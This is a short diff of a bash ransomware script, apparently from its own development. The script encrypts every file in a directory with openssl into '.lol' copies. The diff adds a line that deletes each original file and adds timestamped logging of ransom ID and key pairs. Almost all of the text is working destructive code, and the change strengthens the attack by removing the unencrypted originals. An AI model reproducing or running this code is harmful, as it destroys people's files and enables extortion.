@@ -28,15 +28,16 @@ filecount=$(ls -1 | grep -v "ransom" | grep -v ".lol" | wc -l)
 for f in *
 do 
 	
-	if [[ $f != "ransom"* ]] && [[ $f != *".lol" ]]; then
+	if [[ $f != "ransom"* ]] && [[ $f != *".lol" ]]; then #encrypt all files that are not already encrypted nor the ransom note file
 		echo "encrypting $f ($currentfile/$filecount)..."
 		openssl aes-256-cbc -a -salt -in $f -out $f.lol -k $enc_key
 		#dont forget to delete orginal file
+		rm $f
 		currentfile=$((currentfile+1))
 	fi
 
 done
 
 cd $LOCALPATH 
-echo $ransomid $enc_key >> keys/keys.txt #store ransomid and encryption key pair
+echo `date --rfc-3339=seconds` "|" $ransomid "|" $enc_key >> keys/keys.txt #store ransomid and encryption key pair
 echo Encryption complete. check keys/keys.txt for ransom id and key
